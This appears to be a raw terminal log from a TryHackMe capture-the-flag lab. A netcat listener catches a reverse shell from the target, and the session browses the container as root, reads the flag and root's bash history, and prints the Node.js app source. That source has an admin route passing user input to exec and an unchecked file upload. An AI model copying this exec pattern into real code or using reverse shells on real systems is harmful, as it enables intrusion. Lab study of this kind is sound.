
```sh
┌──(kali㉿kali)-[~/shells]
└─$ nc -lvnp 443
listening on [any] 443 ...
connect to [10.18.21.236] from (UNKNOWN) [10.10.89.15] 39006

ls
assets
content
html
index.js
modules
node_modules
package.json
ls -la                              
total 44
drwxr-xr-x  1 root root 4096 Jul  3  2020 .
drwxr-xr-x  1 root root 4096 Jul  3  2020 ..
drwxrwxr-x  6 root root 4096 Jul  3  2020 assets
drwxrwxr-x  1 root root 4096 Apr  1 12:41 content
drwxrwxr-x  2 root root 4096 Jul  3  2020 html
-rw-rw-r--  1 root root 2372 Jul  3  2020 index.js
drwxrwxr-x  2 root root 4096 Jul  3  2020 modules
drwxrwxr-x 61 root root 4096 Jul  3  2020 node_modules
-rw-rw-r--  1 root root  337 Jun 13  2020 package.json
pwd
/var/www/html
cd..
/bin/sh: 5: cd..: not found
cd 
cd ..
ls -la
total 60
drwxr-xr-x   1 root root 4096 Jul  3  2020 .
drwxr-xr-x   1 root root 4096 Jul  3  2020 ..
-rwxr-xr-x   1 root root    0 Jul  3  2020 .dockerenv
lrwxrwxrwx   1 root root    7 Jun  6  2020 bin -> usr/bin
drwxr-xr-x   2 root root 4096 Apr 15  2020 boot
drwxr-xr-x   5 root root  360 Apr  1 12:31 dev
drwxr-xr-x   1 root root 4096 Jul  3  2020 etc
drwxr-xr-x   2 root root 4096 Apr 15  2020 home
lrwxrwxrwx   1 root root    7 Jun  6  2020 lib -> usr/lib
lrwxrwxrwx   1 root root    9 Jun  6  2020 lib32 -> usr/lib32
lrwxrwxrwx   1 root root    9 Jun  6  2020 lib64 -> usr/lib64
lrwxrwxrwx   1 root root   10 Jun  6  2020 libx32 -> usr/libx32
drwxr-xr-x   2 root root 4096 Jun  6  2020 media
drwxr-xr-x   2 root root 4096 Jun  6  2020 mnt
drwxr-xr-x   2 root root 4096 Jun  6  2020 opt
dr-xr-xr-x 150 root root    0 Apr  1 12:31 proc
drwx------   1 root root 4096 Jul  3  2020 root
drwxr-xr-x   1 root root 4096 Jun 17  2020 run
lrwxrwxrwx   1 root root    8 Jun  6  2020 sbin -> usr/sbin
drwxr-xr-x   2 root root 4096 Jun  6  2020 srv
dr-xr-xr-x  13 root root    0 Apr  1 12:31 sys
drwxrwxrwt   1 root root 4096 Jul  3  2020 tmp
drwxr-xr-x   1 root root 4096 Jun  6  2020 usr
drwxr-xr-x   1 root root 4096 Jul  3  2020 var
pwd
/
cd var
cd www
ls -la
total 28
drwxr-xr-x 1 root root 4096 Jul  3  2020 .
drwxr-xr-x 1 root root 4096 Jul  3  2020 ..
-rw-r--r-- 1 root root   38 Jul  3  2020 flag.txt
drwxr-xr-x 1 root root 4096 Jul  3  2020 html
cat flag.txt
THM{NzRlYTUwNTIzODMwMWZhMzBiY2JlZWU2}
whoami
root
pwd
/var/www
cd /
pwd
/
ls -la
total 60
drwxr-xr-x   1 root root 4096 Jul  3  2020 .
drwxr-xr-x   1 root root 4096 Jul  3  2020 ..
-rwxr-xr-x   1 root root    0 Jul  3  2020 .dockerenv
lrwxrwxrwx   1 root root    7 Jun  6  2020 bin -> usr/bin
drwxr-xr-x   2 root root 4096 Apr 15  2020 boot
drwxr-xr-x   5 root root  360 Apr  1 12:31 dev
drwxr-xr-x   1 root root 4096 Jul  3  2020 etc
drwxr-xr-x   2 root root 4096 Apr 15  2020 home
lrwxrwxrwx   1 root root    7 Jun  6  2020 lib -> usr/lib
lrwxrwxrwx   1 root root    9 Jun  6  2020 lib32 -> usr/lib32
lrwxrwxrwx   1 root root    9 Jun  6  2020 lib64 -> usr/lib64
lrwxrwxrwx   1 root root   10 Jun  6  2020 libx32 -> usr/libx32
drwxr-xr-x   2 root root 4096 Jun  6  2020 media
drwxr-xr-x   2 root root 4096 Jun  6  2020 mnt
drwxr-xr-x   2 root root 4096 Jun  6  2020 opt
dr-xr-xr-x 149 root root    0 Apr  1 12:31 proc
drwx------   1 root root 4096 Jul  3  2020 root
drwxr-xr-x   1 root root 4096 Jun 17  2020 run
lrwxrwxrwx   1 root root    8 Jun  6  2020 sbin -> usr/sbin
drwxr-xr-x   2 root root 4096 Jun  6  2020 srv
dr-xr-xr-x  13 root root    0 Apr  1 12:51 sys
drwxrwxrwt   1 root root 4096 Jul  3  2020 tmp
drwxr-xr-x   1 root root 4096 Jun  6  2020 usr
drwxr-xr-x   1 root root 4096 Jul  3  2020 var
cd home
ls -la
total 8
drwxr-xr-x 2 root root 4096 Apr 15  2020 .
drwxr-xr-x 1 root root 4096 Jul  3  2020 ..
cd ..
ls -la
total 60
drwxr-xr-x   1 root root 4096 Jul  3  2020 .
drwxr-xr-x   1 root root 4096 Jul  3  2020 ..
-rwxr-xr-x   1 root root    0 Jul  3  2020 .dockerenv
lrwxrwxrwx   1 root root    7 Jun  6  2020 bin -> usr/bin
drwxr-xr-x   2 root root 4096 Apr 15  2020 boot
drwxr-xr-x   5 root root  360 Apr  1 12:31 dev
drwxr-xr-x   1 root root 4096 Jul  3  2020 etc
drwxr-xr-x   2 root root 4096 Apr 15  2020 home
lrwxrwxrwx   1 root root    7 Jun  6  2020 lib -> usr/lib
lrwxrwxrwx   1 root root    9 Jun  6  2020 lib32 -> usr/lib32
lrwxrwxrwx   1 root root    9 Jun  6  2020 lib64 -> usr/lib64
lrwxrwxrwx   1 root root   10 Jun  6  2020 libx32 -> usr/libx32
drwxr-xr-x   2 root root 4096 Jun  6  2020 media
drwxr-xr-x   2 root root 4096 Jun  6  2020 mnt
drwxr-xr-x   2 root root 4096 Jun  6  2020 opt
dr-xr-xr-x 149 root root    0 Apr  1 12:31 proc
drwx------   1 root root 4096 Jul  3  2020 root
drwxr-xr-x   1 root root 4096 Jun 17  2020 run
lrwxrwxrwx   1 root root    8 Jun  6  2020 sbin -> usr/sbin
drwxr-xr-x   2 root root 4096 Jun  6  2020 srv
dr-xr-xr-x  13 root root    0 Apr  1 12:51 sys
drwxrwxrwt   1 root root 4096 Jul  3  2020 tmp
drwxr-xr-x   1 root root 4096 Jun  6  2020 usr
drwxr-xr-x   1 root root 4096 Jul  3  2020 var
cd root
ls -la
total 20
drwx------ 1 root root 4096 Jul  3  2020 .
drwxr-xr-x 1 root root 4096 Jul  3  2020 ..
-rw------- 1 root root   78 Jul  3  2020 .bash_history
-rw-r--r-- 1 root root 3106 Dec  5  2019 .bashrc
-rw-r--r-- 1 root root  161 Dec  5  2019 .profile
cat .bash_history
ls
cd assets/
ls
cd js
ls
cat parseurl.js 
cd ..
cat js/upload.js 
clear
exit
cd ..
ls -la
total 60
drwxr-xr-x   1 root root 4096 Jul  3  2020 .
drwxr-xr-x   1 root root 4096 Jul  3  2020 ..
-rwxr-xr-x   1 root root    0 Jul  3  2020 .dockerenv
lrwxrwxrwx   1 root root    7 Jun  6  2020 bin -> usr/bin
drwxr-xr-x   2 root root 4096 Apr 15  2020 boot
drwxr-xr-x   5 root root  360 Apr  1 12:31 dev
drwxr-xr-x   1 root root 4096 Jul  3  2020 etc
drwxr-xr-x   2 root root 4096 Apr 15  2020 home
lrwxrwxrwx   1 root root    7 Jun  6  2020 lib -> usr/lib
lrwxrwxrwx   1 root root    9 Jun  6  2020 lib32 -> usr/lib32
lrwxrwxrwx   1 root root    9 Jun  6  2020 lib64 -> usr/lib64
lrwxrwxrwx   1 root root   10 Jun  6  2020 libx32 -> usr/libx32
drwxr-xr-x   2 root root 4096 Jun  6  2020 media
drwxr-xr-x   2 root root 4096 Jun  6  2020 mnt
drwxr-xr-x   2 root root 4096 Jun  6  2020 opt
dr-xr-xr-x 149 root root    0 Apr  1 12:31 proc
drwx------   1 root root 4096 Jul  3  2020 root
drwxr-xr-x   1 root root 4096 Jun 17  2020 run
lrwxrwxrwx   1 root root    8 Jun  6  2020 sbin -> usr/sbin
drwxr-xr-x   2 root root 4096 Jun  6  2020 srv
dr-xr-xr-x  13 root root    0 Apr  1 12:51 sys
drwxrwxrwt   1 root root 4096 Jul  3  2020 tmp
drwxr-xr-x   1 root root 4096 Jun  6  2020 usr
drwxr-xr-x   1 root root 4096 Jul  3  2020 var
pwd
/
cd var
ls -la
total 56
drwxr-xr-x 1 root root  4096 Jul  3  2020 .
drwxr-xr-x 1 root root  4096 Jul  3  2020 ..
drwxr-xr-x 2 root root  4096 Apr 15  2020 backups
drwxr-xr-x 1 root root  4096 Jun  6  2020 cache
drwxr-xr-x 1 root root  4096 Jun  6  2020 lib
drwxrwsr-x 2 root staff 4096 Apr 15  2020 local
lrwxrwxrwx 1 root root     9 Jun  6  2020 lock -> /run/lock
drwxr-xr-x 1 root root  4096 Jun  6  2020 log
drwxrwsr-x 2 root mail  4096 Jun  6  2020 mail
drwxr-xr-x 2 root root  4096 Jun  6  2020 opt
lrwxrwxrwx 1 root root     4 Jun  6  2020 run -> /run
drwxr-xr-x 2 root root  4096 Jun  6  2020 spool
drwxrwxrwt 2 root root  4096 Jun  6  2020 tmp
drwxr-xr-x 1 root root  4096 Jul  3  2020 www
cd ww
/bin/sh: 31: cd: can´t cd to ww
ls -la
total 56
drwxr-xr-x 1 root root  4096 Jul  3  2020 .
drwxr-xr-x 1 root root  4096 Jul  3  2020 ..
drwxr-xr-x 2 root root  4096 Apr 15  2020 backups
drwxr-xr-x 1 root root  4096 Jun  6  2020 cache
drwxr-xr-x 1 root root  4096 Jun  6  2020 lib
drwxrwsr-x 2 root staff 4096 Apr 15  2020 local
lrwxrwxrwx 1 root root     9 Jun  6  2020 lock -> /run/lock
drwxr-xr-x 1 root root  4096 Jun  6  2020 log
drwxrwsr-x 2 root mail  4096 Jun  6  2020 mail
drwxr-xr-x 2 root root  4096 Jun  6  2020 opt
lrwxrwxrwx 1 root root     4 Jun  6  2020 run -> /run
drwxr-xr-x 2 root root  4096 Jun  6  2020 spool
drwxrwxrwt 2 root root  4096 Jun  6  2020 tmp
drwxr-xr-x 1 root root  4096 Jul  3  2020 www
cd www
ls -la
total 28
drwxr-xr-x 1 root root 4096 Jul  3  2020 .
drwxr-xr-x 1 root root 4096 Jul  3  2020 ..
-rw-r--r-- 1 root root   38 Jul  3  2020 flag.txt
drwxr-xr-x 1 root root 4096 Jul  3  2020 html
pwd
/var/www
ls -la
total 28
drwxr-xr-x 1 root root 4096 Jul  3  2020 .
drwxr-xr-x 1 root root 4096 Jul  3  2020 ..
-rw-r--r-- 1 root root   38 Jul  3  2020 flag.txt
drwxr-xr-x 1 root root 4096 Jul  3  2020 html
cd html
ls -la
total 44
drwxr-xr-x  1 root root 4096 Jul  3  2020 .
drwxr-xr-x  1 root root 4096 Jul  3  2020 ..
drwxrwxr-x  6 root root 4096 Jul  3  2020 assets
drwxrwxr-x  1 root root 4096 Apr  1 12:41 content
drwxrwxr-x  2 root root 4096 Jul  3  2020 html
-rw-rw-r--  1 root root 2372 Jul  3  2020 index.js
drwxrwxr-x  2 root root 4096 Jul  3  2020 modules
drwxrwxr-x 61 root root 4096 Jul  3  2020 node_modules
-rw-rw-r--  1 root root  337 Jun 13  2020 package.json
cat index.js
const express = require("express");
const fs = require("fs");
const cors = require("cors");
const bodyParser = require("body-parser");
const morgan = require("morgan");
const _ = require("lodash");
const app = express();
const exec = require("child_process").exec;

//Static functions
function fourohfour (req, res) {
        res.status(404);
        res.sendFile(__dirname+"/html/404.html");
}

function nameGen() {
        let result = "";
        const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
        const charLength = characters.length;
        for (var i = 0; i < 3; i++){
                result += characters.charAt(Math.floor(Math.random() * charLength));
        }
        return result
}

//Web app
app.use(cors());
app.use(bodyParser.json({limit:"500000"}));
app.use(bodyParser.urlencoded({extended: true}));
app.use(morgan("dev"));

app.use("/assets", express.static(__dirname + '/assets'));
app.use("/content", express.static(__dirname + "/content"));
app.use("/modules", express.static(__dirname + "/modules"));

app.get("/admin", (req, res) => {
        res.sendFile(__dirname + "/html/admin.html");
});

app.post("/admin", (req, res) => {
        if (req.body.cmd){
                let cmd = req.body.cmd.replace(/(https?)|[^\w-_./]/g, "");
                exec("node " + __dirname + "/modules/" + cmd, function callback(error, stdout, stderr){
                        if (error){
                                console.log(error);
                                return res.redirect("/admin?submit=failure");
                        } else {
                                return res.redirect("/admin?submit=success");
                        }
                });
        } else {
                return res.redirect("/admin?submit=invalid");
        }
});

app.get("/", (req, res) => {
        res.sendFile(__dirname + "/html/index.html");
});

app.post("/", async (req, res) => {
        if (!req.body.file) {
                return res.send("failure").end();
        } 
        let file = req.body.file;
        let type = req.body.type;
        let name = req.body.name;
        //MIME check
        if (req.body.type != "image/jpeg"){
                return res.send("invalid").end();
        }
        'use strict';
        let encodedData = file.split(",")[1];
        let buff = Buffer.from(encodedData, "base64");
        let fileName = nameGen() + ".jpg";
        console.log(fileName);
        fs.writeFile("content/" + fileName, buff, (err) => {
                if (err) throw err;
        });
        return res.send("success").end();

});
app.post("/*", (req, res) => fourohfour(req, res));
app.get("/*", (req, res) => fourohfour(req, res));



const server = app.listen(80, function() {
        const host = server.address().address;
        const port = server.address().port;
        console.log("Server Up");
});
pwd 
/var/www/html
ls -la
total 44
drwxr-xr-x  1 root root 4096 Jul  3  2020 .
drwxr-xr-x  1 root root 4096 Jul  3  2020 ..
drwxrwxr-x  6 root root 4096 Jul  3  2020 assets
drwxrwxr-x  1 root root 4096 Apr  1 12:41 content
drwxrwxr-x  2 root root 4096 Jul  3  2020 html
-rw-rw-r--  1 root root 2372 Jul  3  2020 index.js
drwxrwxr-x  2 root root 4096 Jul  3  2020 modules
drwxrwxr-x 61 root root 4096 Jul  3  2020 node_modules
-rw-rw-r--  1 root root  337 Jun 13  2020 package.json
cd content
ls -la
total 1732
drwxrwxr-x 1 root root   4096 Apr  1 12:41 .
drwxr-xr-x 1 root root   4096 Jul  3  2020 ..
-rw-rw-r-- 1 root root 705442 Jun 30  2020 ABH.jpg
-rw-r--r-- 1 root root    382 Apr  1 12:41 LBB.jpg
-rw-rw-r-- 1 root root 444808 Jun 30  2020 LKQ.jpg
-rw-rw-r-- 1 root root 247159 Jun 30  2020 SAD.jpg
-rw-rw-r-- 1 root root 342033 Jun 30  2020 UAD.jpg
-rw-r--r-- 1 root root    387 Apr  1 12:36 UKD.jpg
-rw-r--r-- 1 root root    382 Apr  1 12:32 XBE.jpg
file abh.jpg
/bin/sh: 44: file: not found
file ABH.jpg
/bin/sh: 45: file: not found
ls -la
total 1732
drwxrwxr-x 1 root root   4096 Apr  1 12:41 .
drwxr-xr-x 1 root root   4096 Jul  3  2020 ..
-rw-rw-r-- 1 root root 705442 Jun 30  2020 ABH.jpg
-rw-r--r-- 1 root root    382 Apr  1 12:41 LBB.jpg
-rw-rw-r-- 1 root root 444808 Jun 30  2020 LKQ.jpg
-rw-rw-r-- 1 root root 247159 Jun 30  2020 SAD.jpg
-rw-rw-r-- 1 root root 342033 Jun 30  2020 UAD.jpg
-rw-r--r-- 1 root root    387 Apr  1 12:36 UKD.jpg
-rw-r--r-- 1 root root    382 Apr  1 12:32 XBE.jpg
cd ..
ls -la
total 44
drwxr-xr-x  1 root root 4096 Jul  3  2020 .
drwxr-xr-x  1 root root 4096 Jul  3  2020 ..
drwxrwxr-x  6 root root 4096 Jul  3  2020 assets
drwxrwxr-x  1 root root 4096 Apr  1 12:41 content
drwxrwxr-x  2 root root 4096 Jul  3  2020 html
-rw-rw-r--  1 root root 2372 Jul  3  2020 index.js
drwxrwxr-x  2 root root 4096 Jul  3  2020 modules
drwxrwxr-x 61 root root 4096 Jul  3  2020 node_modules
-rw-rw-r--  1 root root  337 Jun 13  2020 package.json
cd modules
ls -la
total 16
drwxrwxr-x 2 root root 4096 Jul  3  2020 .
drwxr-xr-x 1 root root 4096 Jul  3  2020 ..
-rw-rw-r-- 1 root root   26 Jul  3  2020 it-works.js
cat it-works.js
console.log("It works!");
cd ../html
ls -la
total 24
drwxrwxr-x 2 root root 4096 Jul  3  2020 .
drwxr-xr-x 1 root root 4096 Jul  3  2020 ..
-rw-rw-r-- 1 root root  844 Jul  3  2020 404.html
-rw-rw-r-- 1 root root 1238 Jul  3  2020 admin.html
-rw-rw-r-- 1 root root 1514 Jul  3  2020 index.html
cat admin.html
<!DOCTYPE html>
<html>
        <head>
                <title>Admin Page - Top Secret!</title>
                <meta charset="utf-8">
                <meta name="viewport" content="width=device-width, user-scalable=no">
                <link type="image/x-icon" rel="shortcut icon" href="/assets/favicon.ico">
                <link type="text/css" rel="stylesheet" href="/assets/css/backend.css">
                <link type="text/css" rel="stylesheet" href="/assets/css/cinzel.css">
                <link type="text/css" rel="stylesheet" href="/assets/css/exo.css">
                <link type="text/css" rel="stylesheet" href="/assets/css/icons.css">
                <script src="assets/js/jquery-3.5.1.min.js"></script>
                <script src="assets/js/parseurl.js"></script>
        </head>
        <body>
                <div class="background"></div>
                <header><a href="/"><i id="home" class="material-icons">home</i></a></header>
                <main>
                        <h1>Admin Page</h1>
                        <p>As a reminder: use this form to activate modules from the /modules directory.</p>
                        <form method=post>
                                <input type=text name=cmd placeholder="Enter file to execute" maxlength=25>
                                <input id="submitBtn" type=submit style="display:none">
                        </form>
                        <button onclick='$("#submitBtn").click()'><i id="forward" class="material-icons">arrow_forward</i></button>
                </main>
        <footer><p>&copy;Jewel</p></footer>   
        </body>
</html>
pwd
/var/www/html/html

```